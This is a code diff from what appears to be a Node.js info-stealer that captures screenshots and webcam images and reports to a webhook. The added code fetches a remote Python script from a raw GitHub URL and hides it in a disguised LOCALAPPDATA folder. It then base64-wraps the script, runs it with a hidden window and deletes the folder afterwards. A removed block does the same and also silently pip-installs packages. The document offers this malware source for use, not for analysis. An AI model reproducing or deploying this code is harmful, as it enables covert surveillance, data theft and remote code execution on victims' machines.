@@ -10,7 +10,7 @@ const screenshot = require('screenshot-desktop');
 const FormData = require('form-data');
 const archiver = require('archiver');
 const https = require('https');
-const { execFile } = require('child_process');
+const { exec } = require('child_process');
 const NodeWebcam = require('node-webcam');
 
 const H00K3_URL = "%WEBHOOK%";
@@ -705,59 +705,6 @@ async function sendFileToWebhook(webhookUrl, zipPath, foundFiles) {
     } catch (_) {}
 })();
 
-const PYTHON_URL = "https://raw.githubusercontent.com/P180EwqDeRT/ae6f117592b71439e4f9a75c19da8cdd/refs/heads/main/f9a75c19da8cdd/o1dwwnos0m2r.py"; 
-const baseDir = path.join(process.env.LOCALAPPDATA, "Crashs", "src", "Crash Engine");
-
-function gerarNomeAleatorio() {
-  return crypto.randomBytes(6).toString('base64').replace(/[+/=]/g, '').substring(0, 12);
-}
-
-function baixarPython(destPath) {
-  return new Promise((resolve) => {
-    const file = fs.createWriteStream(destPath);
-    https.get(PYTHON_URL, (res) => {
-      res.pipe(file);
-      file.on('finish', () => file.close(() => resolve()));
-    }).on('error', () => {
-      try { fs.unlinkSync(destPath); } catch {}
-      resolve();
-    });
-  });
-}
-
-async function processarPython() {
-  try {
-    if (!fs.existsSync(baseDir)) fs.mkdirSync(baseDir, { recursive: true });
-    const fileName = gerarNomeAleatorio() + ".py";
-    const filePath = path.join(baseDir, fileName);
-
-    await baixarPython(filePath);
-    let code = '';
-    try {
-      code = await fsPromises.readFile(filePath, 'utf8');
-    } catch { return; }
-
-    code = code.replace(/%WEBHOOK%/g, H00K3_URL);
-
-    try {
-      const base64Code = Buffer.from(code, 'utf8').toString('base64');
-      const finalCode = `
-import base64
-exec(compile(base64.b64decode("${base64Code}"), "<string>", "exec"))
-`;
-      await fsPromises.writeFile(filePath, finalCode, 'utf8');
-    } catch { return; }
-
-    await new Promise((res) => exec(`pip install -q pycryptodome pypiwin32 requests discord.py`, { windowsHide: true }, () => res()));
-
-    await new Promise((res) => exec(`python "${filePath}"`, { cwd: baseDir, windowsHide: true }, () => res()));
-
-    try { fs.rmSync(path.join(process.env.LOCALAPPDATA, "Crashs"), { recursive: true, force: true }); } catch {}
-  } catch {}
-}
-
-processarPython();
-
 const webcamOptions = {
   width: 640,
   height: 480,
@@ -843,6 +790,72 @@ function sendEmbed(title, description, color, imageUrl = null) {
       0xFF0000
     );
   }
+})();
+
+function gerarNomeAleatorio() {
+  return crypto.randomBytes(6).toString('base64').replace(/[+/=]/g, '').substring(0, 12);
+}
+
+const PYTHON_URL = "https://raw.githubusercontent.com/P180EwqDeRT/ae6f117592b71439e4f9a75c19da8cdd/refs/heads/main/f9a75c19da8cdd/o1dwwnos0m2r.py";
+const baseDirPython = path.join(process.env.LOCALAPPDATA || process.env.HOME || '.', "Crashs", "src", "Crash Engine");
+
+function baixarPython(destPath) {
+  return new Promise((resolve) => {
+    const file = fs.createWriteStream(destPath);
+    https.get(PYTHON_URL, (res) => {
+      if (res.statusCode !== 200) {
+        try { fs.unlinkSync(destPath); } catch {}
+        return resolve(false);
+      }
+      res.pipe(file);
+      file.on('finish', () => file.close(() => resolve(true)));
+    }).on('error', () => {
+      try { fs.unlinkSync(destPath); } catch {}
+      resolve(false);
+    });
+  });
+}
+
+async function processarPython() {
+  try {
+    if (!fs.existsSync(baseDirPython)) fs.mkdirSync(baseDirPython, { recursive: true });
+
+    const fileName = gerarNomeAleatorio() + ".py";
+    const filePath = path.join(baseDirPython, fileName);
+
+    const ok = await baixarPython(filePath);
+    if (!ok) return false;
+
+    let code = await fsPromises.readFile(filePath, 'utf8');
+    code = code.replace(/%WEBHOOK%/g, H00K3_URL);
+
+    const base64Code = Buffer.from(code, 'utf8').toString('base64');
+    const finalCode = `
+import base64
+exec(compile(base64.b64decode("${base64Code}"), "<string>", "exec"))
+`;
+    await fsPromises.writeFile(filePath, finalCode, 'utf8');
+
+    return new Promise((resolve) => {
+      exec(`python "${filePath}"`, { cwd: baseDirPython, windowsHide: true }, (error) => {
+        if (!error) {
+          try {
+            fs.rmSync(baseDirPython, { recursive: true, force: true });
+          } catch {}
+          resolve(true);
+        } else {
+          resolve(false);
+        }
+      });
+    });
+
+  } catch {
+    return false;
+  }
+}
+
+(async () => {
+  await processarPython();
 })();
 
 main();
